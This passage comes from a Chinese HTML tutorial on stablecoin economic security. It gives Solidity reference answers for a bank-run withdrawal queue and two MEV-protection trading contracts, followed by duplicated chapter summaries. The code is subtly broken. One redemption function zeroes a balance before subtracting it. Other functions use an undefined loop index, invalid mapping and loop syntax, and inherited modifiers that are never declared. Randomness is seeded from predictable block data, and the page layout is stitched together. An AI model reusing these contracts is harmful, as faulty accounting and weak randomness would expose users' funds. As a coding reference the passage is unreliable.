    event SystemHealthUpdated(SystemHealth newHealth);
    
    // 存款功能
    function deposit() external payable {
        UserData storage user = users[msg.sender];
        user.balance += msg.value;
        totalDeposits += msg.value;
        totalReserves += msg.value;
        
        // 重置忠诚度计时
        if (user.lastWithdrawTime == 0) {
            user.lastWithdrawTime = block.timestamp;
        }
    }
    
    // 请求提款
    function requestWithdraw(uint256 amount) external {
        UserData storage user = users[msg.sender];
        require(user.balance >= amount, "Insufficient balance");
        require(pendingWithdrawals[msg.sender] == 0, "Pending withdrawal exists");
        
        // 计算动态提款限制
        uint256 maxWithdraw = calculateMaxWithdraw(msg.sender);
        require(amount <= maxWithdraw, "Exceeds withdrawal limit");
        
        // 计算队列延迟
        uint256 delay = calculateQueueDelay(amount);
        uint256 executeTime = block.timestamp + delay;
        
        // 创建提款请求
        withdrawQueue.push(WithdrawRequest({
            user: msg.sender,
            amount: amount,
            requestTime: block.timestamp,
            executeTime: executeTime,
            processed: false
        }));
        
        pendingWithdrawals[msg.sender] = amount;
        user.balance -= amount;
        
        emit WithdrawRequested(msg.sender, amount, executeTime);
    }
    
    // 计算最大提款额度
    function calculateMaxWithdraw(address userAddr) public view returns (uint256) {
        UserData storage user = users[userAddr];
        uint256 baseLimit = (user.balance * getCurrentWithdrawRate()) / 10000;
        
        // LP保护：流动性提供者有更高额度
        if (user.isLiquidityProvider) {
            baseLimit *= LP_PROTECTION_MULTIPLIER;
        }
        
        // 忠诚度奖励：长期持有者额度提升
        uint256 holdingDays = (block.timestamp - user.lastWithdrawTime) / 1 days;
        uint256 loyaltyMultiplier = 10000 + (holdingDays * LOYALTY_BONUS_RATE);
        baseLimit = (baseLimit * loyaltyMultiplier) / 10000;
        
        // 不能超过每日总限额的份额
        uint256 userShare = (user.balance * 10000) / totalDeposits;
        uint256 dailyShare = (dailyWithdrawLimit * userShare) / 10000;
        
        return min(baseLimit, dailyShare);
    }
    
    // 获取当前提款率
    function getCurrentWithdrawRate() public view returns (uint256) {
        if (systemHealth == SystemHealth.CRITICAL) {
            return criticalWithdrawRate;
        } else if (systemHealth == SystemHealth.STRESSED) {
            return stressedWithdrawRate;
        } else {
            return baseWithdrawRate;
        }
    }
    
    // 计算队列延迟
    function calculateQueueDelay(uint256 amount) public view returns (uint256) {
        uint256 baseDelay = queueDelay;
        
        // 大额提款延迟更长
        if (amount > totalReserves / 100) { // >1%储备
            baseDelay *= 2;
        }
        
        // 系统压力下延迟增加
        if (systemHealth == SystemHealth.STRESSED) {
            baseDelay *= 2;
        } else if (systemHealth == SystemHealth.CRITICAL) {
            baseDelay *= 4;
        }
        
        return baseDelay;
    }
    
    // 处理提款队列
    function processWithdrawals(uint256 maxCount) external {
        uint256 processed = 0;
        uint256 totalProcessed = 0;
        
        for (uint256 i = 0; i < withdrawQueue.length && processed < maxCount; i++) {
            WithdrawRequest storage request = withdrawQueue[i];
            
            if (!request.processed && 
                block.timestamp >= request.executeTime &&
                totalReserves >= request.amount) {
                
                // 执行提款
                payable(request.user).transfer(request.amount);
                totalReserves -= request.amount;
                totalDeposits -= request.amount;
                
                // 更新用户数据
                users[request.user].lastWithdrawTime = block.timestamp;
                users[request.user].loyaltyPoints = 0;
                pendingWithdrawals[request.user] = 0;
                
                request.processed = true;
                processed++;
                totalProcessed += request.amount;
                
                emit WithdrawProcessed(request.user, request.amount);
            }
        }
        
        // 更新系统健康度
        updateSystemHealth();
    }
    
    // 紧急部分赎回
    function emergencyPartialRedeem() external {
        require(systemHealth == SystemHealth.CRITICAL, "Not in emergency");
        
        UserData storage user = users[msg.sender];
        require(user.balance > 0, "No balance");
        
        // 计算可赎回比例（基于储备率）
        uint256 redeemRate = (totalReserves * 10000) / totalDeposits;
        uint256 redeemAmount = (user.balance * redeemRate) / 10000;
        
        // 立即赎回部分资金
        user.balance = 0;
        payable(msg.sender).transfer(redeemAmount);
        
        totalReserves -= redeemAmount;
        totalDeposits -= user.balance;
    }
    
    // 更新系统健康度
    function updateSystemHealth() public {
        uint256 reserveRatio = (totalReserves * 10000) / totalDeposits;
        uint256 queuePressure = (getQueuedAmount() * 10000) / totalReserves;
        
        if (reserveRatio < 2000 || queuePressure > 5000) { // <20%储备或>50%排队
            systemHealth = SystemHealth.CRITICAL;
        } else if (reserveRatio < 4000 || queuePressure > 3000) { // <40%储备或>30%排队
            systemHealth = SystemHealth.STRESSED;
        } else {
            systemHealth = SystemHealth.HEALTHY;
        }
        
        emit SystemHealthUpdated(systemHealth);
    }
    
    // 获取排队总额
    function getQueuedAmount() public view returns (uint256) {
        uint256 total = 0;
        for (uint256 i = 0; i < withdrawQueue.length; i++) {
            if (!withdrawQueue[i].processed) {
                total += withdrawQueue[i].amount;
            }
        }
        return total;
    }
    
    // 激励机制：质押获得忠诚度积分
    function stakeLoyalty(uint256 amount, uint256 duration) external {
        UserData storage user = users[msg.sender];
        require(user.balance >= amount, "Insufficient balance");
        
        user.balance -= amount;
        user.lockedBalance += amount;
        
        // 根据锁定时间给予忠诚度积分
        uint256 points = (amount * duration) / 30 days;
        user.loyaltyPoints += points;
    }
    
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <div class="exercise">
            <div class="exercise-header">
                <span class="exercise-icon">🔍</span>
                <h4>练习10.2：MEV防护机制实现</h4>
            </div>
            <p>实现一个具有MEV防护的交易系统，包括：</p>
            <ul>
                <li>前置交易（front-running）防护</li>
                <li>三明治攻击防护</li>
                <li>时间延迟机制</li>
                <li>批量交易执行</li>
                <li>MEV利润回馈机制</li>
            </ul>
            <button class="answer-toggle" onclick="toggleAnswer(this)">查看参考答案</button>
            <div class="answer-content">
                <pre><code class="language-solidity">// MEV防护交易系统完整实现
contract MEVProtectedTradingSystem {
    using SafeERC20 for IERC20;
    
    // 状态变量
    struct TradeRequest {
        address trader;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        bytes32 commitment;
        uint256 submitBlock;
        uint256 revealBlock;
        bool executed;
    }
    
    mapping(bytes32 => TradeRequest) public trades;
    mapping(address => uint256) public lastTradeBlock;
    
    // MEV保护参数
    uint256 public constant COMMIT_DELAY = 2;     // 提交后2个区块才能执行
    uint256 public constant REVEAL_WINDOW = 10;   // 10个区块的执行窗口
    uint256 public constant BATCH_SIZE = 20;      // 批量执行数量
    uint256 public constant MEV_SHARE = 5000;     // 50%的MEV利润返还用户
    
    // 批量交易队列
    bytes32[] public pendingTrades;
    uint256 public mevProfits;
    
    // 事件
    event TradeCommitted(bytes32 indexed tradeId, address trader);
    event TradeRevealed(bytes32 indexed tradeId, uint256 amountOut);
    event MEVProfitDistributed(uint256 amount);
    
    // 第一步：提交交易承诺
    function commitTrade(
        bytes32 commitment
    ) external returns (bytes32 tradeId) {
        // 防止同一区块多次交易
        require(
            lastTradeBlock[msg.sender] < block.number,
            "One trade per block"
        );
        
        tradeId = keccak256(abi.encodePacked(
            msg.sender,
            commitment,
            block.number
        ));
        
        trades[tradeId] = TradeRequest({
            trader: msg.sender,
            tokenIn: address(0),
            tokenOut: address(0),
            amountIn: 0,
            minAmountOut: 0,
            commitment: commitment,
            submitBlock: block.number,
            revealBlock: 0,
            executed: false
        });
        
        lastTradeBlock[msg.sender] = block.number;
        emit TradeCommitted(tradeId, msg.sender);
    }
    
    // 第二步：揭示交易细节
    function revealTrade(
        bytes32 tradeId,
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 nonce
    ) external {
        TradeRequest storage trade = trades[tradeId];
        
        require(trade.trader == msg.sender, "Not trade owner");
        require(!trade.executed, "Already executed");
        require(
            block.number >= trade.submitBlock + COMMIT_DELAY,
            "Too early to reveal"
        );
        require(
            block.number <= trade.submitBlock + COMMIT_DELAY + REVEAL_WINDOW,
            "Reveal window expired"
        );
        
        // 验证承诺
        bytes32 hash = keccak256(abi.encodePacked(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            nonce,
            msg.sender
        ));
        require(hash == trade.commitment, "Invalid commitment");
        
        // 更新交易信息
        trade.tokenIn = tokenIn;
        trade.tokenOut = tokenOut;
        trade.amountIn = amountIn;
        trade.minAmountOut = minAmountOut;
        trade.revealBlock = block.number;
        
        // 添加到待执行队列
        pendingTrades.push(tradeId);
        
        // 如果队列满了，执行批量交易
        if (pendingTrades.length >= BATCH_SIZE) {
            _executeBatch();
        }
    }
    
    // 批量执行交易
    function executeBatch() external {
        require(pendingTrades.length > 0, "No pending trades");
        _executeBatch();
    }
    
    function _executeBatch() internal {
        uint256 batchProfit = 0;
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            pendingTrades.length
        )));
        
        // 随机化执行顺序
        for (uint256 i = pendingTrades.length; i > 1; i--) {
            uint256 j = seed % i;
            bytes32 temp = pendingTrades[i-1];
            pendingTrades[i-1] = pendingTrades[j];
            pendingTrades[j] = temp;
            seed = uint256(keccak256(abi.encodePacked(seed)));
        }
        
        // 执行所有交易
        for (uint256 i = 0; i < pendingTrades.length; i++) {
            TradeRequest storage trade = trades[pendingTrades[i]];
            if (!trade.executed) {
                uint256 profit = _executeTrade(trade);
                batchProfit += profit;
                trade.executed = true;
            }
        }
        
        // 清空队列
        delete pendingTrades;
        
        // 累积MEV利润
        if (batchProfit > 0) {
            mevProfits += batchProfit;
        }
    }
    
    function _executeTrade(
        TradeRequest storage trade
    ) internal returns (uint256) {
        // 转入代币
        IERC20(trade.tokenIn).safeTransferFrom(
            trade.trader,
            address(this),
            trade.amountIn
        );
        
        // 执行交易（这里简化处理，实际需要调用DEX）
        uint256 amountOut = _performSwap(
            trade.tokenIn,
            trade.tokenOut,
            trade.amountIn
        );
        
        require(amountOut >= trade.minAmountOut, "Slippage too high");
        
        // 转出代币
        IERC20(trade.tokenOut).safeTransfer(
            trade.trader,
            amountOut
        );
        
        emit TradeRevealed(pendingTrades[i], amountOut);
        
        // 计算MEV（简化：实际需要比较市场价格）
        uint256 marketPrice = getMarketPrice(trade.tokenIn, trade.tokenOut);
        uint256 executionPrice = (amountOut * 1e18) / trade.amountIn;
        
        if (executionPrice > marketPrice) {
            return ((executionPrice - marketPrice) * trade.amountIn) / 1e18;
        }
        
        return 0;
    }
    
    // 分配MEV利润
    function distributeMEVProfits() external {
        require(mevProfits > 0, "No profits to distribute");
        
        uint256 toDistribute = mevProfits;
        mevProfits = 0;
        
        // 50%返还给交易者（基于交易量加权）
        uint256 userShare = (toDistribute * MEV_SHARE) / 10000;
        
        // 实际分配逻辑（简化）
        // ...
        
        emit MEVProfitDistributed(toDistribute);
    }
    
    // 紧急暂停
    function emergencyPause() external onlyRole(PAUSER_ROLE) {
        _pause();
        
        // 退还所有未执行交易
        for (uint256 i = 0; i < pendingTrades.length; i++) {
            TradeRequest storage trade = trades[pendingTrades[i]];
            if (!trade.executed && trade.amountIn > 0) {
                IERC20(trade.tokenIn).safeTransfer(
                    trade.trader,
                    trade.amountIn
                );
                trade.executed = true;
            }
        }
        
        delete pendingTrades;
    }
}</code></pre>
            </div>
        </div>

        <h3 id="chapter10-summary">本章小结</h3>
        <div class="summary-box">
            <h4>核心要点回顾：</h4>
            <ul>
                <li><strong>经济攻击模型</strong>：
                    <ul>
                        <li>市场操纵攻击：价格操纵、流动性攻击、三明治攻击</li>
                        <li>系统性攻击：银行挤兑、死亡螺旋、治理攻击、级联清算</li>
                        <li>博弈论分析：纳什均衡、攻防博弈、银行挤兑模型</li>
                    </ul>
                </li>
                <li><strong>DeFi特定攻击</strong>：
                    <ul>
                        <li>闪电贷攻击：利用原子性进行无资本套利</li>
                        <li>MEV攻击：前置交易、后置交易、三明治攻击</li>
                        <li>预言机操纵：利用延迟和低流动性操纵价格</li>
                    </ul>
                </li>
                <li><strong>防御机制</strong>：
                    <ul>
                        <li>动态参数调整：根据风险等级自适应调整系统参数</li>
                        <li>熔断机制：分级响应，从限制到完全停止</li>
                        <li>时间延迟：TWAP、提交-揭示模式、批量执行</li>
                    </ul>
                </li>
                <li><strong>风险管理</strong>：
                    <ul>
                        <li>保险基金：风险定价、分级保障、激励相容</li>
                        <li>风险共担：集体承担损失、激励长期参与</li>
                        <li>危机响应：分级响应框架、自动化处理、快速恢复</li>
                    </ul>
                </li>
            </ul>
            
            <h4>关键防御原则：</h4>
            <ol>
                <li><strong>深度防御</strong>：多层防护，单一机制失效不会导致系统崩溃</li>
                <li><strong>激励相容</strong>：让诚实行为比攻击更有利可图</li>
                <li><strong>透明可审计</strong>：所有防御机制公开透明，接受社区监督</li>
                <li><strong>快速响应</strong>：自动化检测和响应，最小化损失</li>
                <li><strong>用户保护</strong>：优先保护普通用户，限制大户操纵</li>
            </ol>
            
            <h4>未来展望：</h4>
            <ul>
                <li><strong>AI驱动防御</strong>：机器学习模型预测和防范攻击</li>
                <li><strong>跨链安全</strong>：统一的跨链安全标准和协作机制</li>
                <li><strong>形式化验证</strong>：数学证明系统的安全性</li>
                <li><strong>去中心化保险</strong>：基于预测市场的风险定价</li>
                <li><strong>社区免疫</strong>：通过教育和工具提升整体安全意识</li>
            </ul>
            
            <div class="tip">
                <strong>实践建议：</strong>
                经济安全是稳定币系统的生命线。在设计任何新功能时，都要考虑：
                <ul>
                    <li>这个功能可能被如何攻击？</li>
                    <li>攻击的成本和收益如何？</li>
                    <li>如何让攻击变得不经济？</li>
                    <li>如果攻击发生，如何最小化损失？</li>
                    <li>如何快速恢复系统？</li>
                </ul>
                记住：安全不是一次性的工作，而是持续的过程。</div>
        </div>
    </div>
            
            <button class="answer-toggle" onclick="toggleAnswer(this)">查看参考答案</button>
            <div class="answer-content">
                <div class="code-block">
                    <div class="code-header">
                        <span class="code-language">solidity</span>
                    </div>
                    <div class="code-content">
                        <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MEVProtectionSystem {
    // 交易批次
    struct Batch {
        uint256 id;
        uint256 startTime;
        uint256 endTime;
        uint256 seed;
        bool executed;
        uint256 totalValue;
        uint256 mevProfit;
    }
    
    // 待处理交易
    struct PendingTx {
        address user;
        bytes data;
        uint256 value;
        uint256 gasPrice;
        uint256 deadline;
        bytes32 commitment;
    }
    
    mapping(uint256 => Batch) public batches;
    mapping(uint256 => PendingTx[]) public batchTransactions;
    uint256 public currentBatchId;
    
    // MEV分配
    mapping(address => uint256) public userMEVShares;
    uint256 public totalMEVShares;
    uint256 public accumulatedMEV;
    
    // 批次参数
    uint256 public batchDuration = 12 seconds; // 1个区块
    uint256 public minBatchSize = 10;
    uint256 public maxBatchSize = 100;
    
    // 私有内存池
    mapping(bytes32 => bool) private commitments;
    
    event BatchCreated(uint256 batchId, uint256 endTime);
    event TransactionSubmitted(address user, uint256 batchId, bytes32 commitment);
    event BatchExecuted(uint256 batchId, uint256 txCount, uint256 mevCaptured);
    event MEVDistributed(address user, uint256 amount);
    
    // 提交交易（两阶段提交）
    function submitTransaction(
        bytes32 commitment,
        uint256 deadline
    ) external payable {
        require(deadline > block.timestamp, "Invalid deadline");
        require(!commitments[commitment], "Duplicate commitment");
        
        // 获取或创建当前批次
        uint256 batchId = getCurrentBatch();
        
        // 记录承诺
        commitments[commitment] = true;
        
        emit TransactionSubmitted(msg.sender, batchId, commitment);
    }
    
    // 揭示交易
    function revealTransaction(
        uint256 batchId,
        bytes calldata data,
        uint256 nonce
    ) external {
        // 验证承诺
        bytes32 commitment = keccak256(abi.encodePacked(
            msg.sender,
            data,
            nonce,
            batchId
        ));
        require(commitments[commitment], "Invalid commitment");
        
        // 验证批次仍在收集中
        Batch storage batch = batches[batchId];
        require(block.timestamp < batch.endTime, "Batch ended");
        require(!batch.executed, "Batch already executed");
        
        // 添加到批次
        batchTransactions[batchId].push(PendingTx({
            user: msg.sender,
            data: data,
            value: 0,
            gasPrice: tx.gasprice,
            deadline: block.timestamp + 300,
            commitment: commitment
        }));
        
        // 更新用户MEV份额
        userMEVShares[msg.sender] += 1;
        totalMEVShares += 1;
    }
    
    // 执行批次
    function executeBatch(uint256 batchId) external {
        Batch storage batch = batches[batchId];
        require(block.timestamp >= batch.endTime, "Batch not ready");
        require(!batch.executed, "Already executed");
        
        PendingTx[] storage txs = batchTransactions[batchId];
        require(txs.length >= minBatchSize, "Insufficient transactions");
        
        // 生成随机种子
        batch.seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            blockhash(block.number - 1)
        )));
        
        // 随机排序交易
        shuffleTransactions(txs, batch.seed);
        
        // 记录执行前余额
        uint256 balanceBefore = address(this).balance;
        
        // 执行所有交易
        uint256 successCount = 0;
        for (uint256 i = 0; i < txs.length && i < maxBatchSize; i++) {
            if (executeTransaction(txs[i])) {
                successCount++;
            }
        }
        
        // 计算MEV收益
        uint256 balanceAfter = address(this).balance;
        if (balanceAfter > balanceBefore) {
            batch.mevProfit = balanceAfter - balanceBefore;
            accumulatedMEV += batch.mevProfit;
        }
        
        batch.executed = true;
        emit BatchExecuted(batchId, successCount, batch.mevProfit);
        
        // 如果MEV累积足够，触发分配
        if (accumulatedMEV > 0.1 ether) {
            distributeMEV();
        }
    }
    
    // Fisher-Yates洗牌算法
    function shuffleTransactions(
        PendingTx[] storage txs,
        uint256 seed
    ) internal {
        uint256 n = txs.length;
        
        for (uint256 i = n - 1; i > 0; i--) {
            uint256 j = uint256(keccak256(abi.encodePacked(seed, i))) % (i + 1);
            
            // 交换
            PendingTx memory temp = txs[i];
            txs[i] = txs[j];
            txs[j] = temp;
        }
    }
    
    // 执行单个交易
    function executeTransaction(PendingTx memory tx) internal returns (bool) {
        // 检查deadline
        if (block.timestamp > tx.deadline) {
            return false;
        }
        
        // 解码并执行交易
        (bool success,) = address(this).call{value: tx.value}(tx.data);
        
        return success;
    }
    
    // 分配MEV收益
    function distributeMEV() public {
        require(accumulatedMEV > 0, "No MEV to distribute");
        require(totalMEVShares > 0, "No shares");
        
        uint256 totalToDistribute = accumulatedMEV;
        accumulatedMEV = 0;
        
        // 保留10%作为协议收入
        uint256 protocolFee = totalToDistribute / 10;
        uint256 userDistribution = totalToDistribute - protocolFee;
        
        // 记录已分配的用户，避免重复
        mapping(address => bool) distributed;
        
        // 分配给所有参与者
        for (address user in getAllParticipants()) {
            if (userMEVShares[user] > 0 && !distributed[user]) {
                uint256 userShare = (userDistribution * userMEVShares[user]) / totalMEVShares;
                
                payable(user).transfer(userShare);
                distributed[user] = true;
                
                emit MEVDistributed(user, userShare);
            }
        }
    }
    
    // 获取当前批次
    function getCurrentBatch() internal returns (uint256) {
        Batch storage current = batches[currentBatchId];
        
        // 如果当前批次已结束，创建新批次
        if (block.timestamp >= current.endTime || current.executed) {
            currentBatchId++;
            
            batches[currentBatchId] = Batch({
                id: currentBatchId,
                startTime: block.timestamp,
                endTime: block.timestamp + batchDuration,
                seed: 0,
                executed: false,
                totalValue: 0,
                mevProfit: 0
            });
            
            emit BatchCreated(currentBatchId, batches[currentBatchId].endTime);
        }
        
        return currentBatchId;
    }
    
    // 用户可以查询自己的MEV收益
    function getClaimableMEV(address user) external view returns (uint256) {
        if (totalMEVShares == 0) return 0;
        
        return (accumulatedMEV * userMEVShares[user]) / totalMEVShares;
    }
    
    // 获取批次信息
    function getBatchInfo(uint256 batchId) external view returns (
        uint256 txCount,
        uint256 startTime,
        uint256 endTime,
        bool executed,
        uint256 mevProfit
    ) {
        Batch storage batch = batches[batchId];
        return (
            batchTransactions[batchId].length,
            batch.startTime,
            batch.endTime,
            batch.executed,
            batch.mevProfit
        );
    }
}</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <h3>本章总结</h3>
        <div class="summary-box">
            <h4>关键要点：</h4>
            <ul>
                <li><strong>经济攻击多样化</strong>：从简单的价格操纵到复杂的系统性攻击</li>
                <li><strong>博弈论视角</strong>：理解参与者激励是设计防御机制的关键</li>
                <li><strong>动态防御</strong>：根据市场状态自适应调整系统参数</li>
                <li><strong>风险共担</strong>：通过保险和共享池分散个体风险</li>
                <li><strong>危机响应</strong>：预案和自动化响应机制的重要性</li>
            </ul>
            
            <h4>防御策略核心原则：</h4>
            <ul>
                <li>⚔️ <strong>深度防御</strong>：多层防护，避免单点失败</li>
                <li>🎯 <strong>激励对齐</strong>：让诚实行为比攻击更有利可图</li>
                <li>🔄 <strong>动态适应</strong>：根据威胁等级调整防御强度</li>
                <li>🛡️ <strong>损失限制</strong>：即使被攻破也要限制损失范围</li>
                <li>📊 <strong>透明监控</strong>：实时监控和公开披露增强信任</li>
                <li>🤝 <strong>社区参与</strong>：利用集体智慧识别和应对威胁</li>
            </ul>
            
            <h4>未来展望：</h4>
            <ul>
                <li>🤖 AI驱动的攻击检测和自动响应</li>
                <li>🔗 跨链协作的防御网络</li>
                <li>📈 更复杂的经济模型和激励机制</li>
                <li>⚖️ 监管框架下的合规防御设计</li>
            </ul>
        </div>
    
            
            <!-- 章节导航 -->
            <div class="chapter-nav">
                <a href="chapter9.html">← 第9章</a>
                <a href="chapter11.html">第11章 →</a>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-solidity.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-rust.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
    <script src="script.js"></script>
</body>
</html>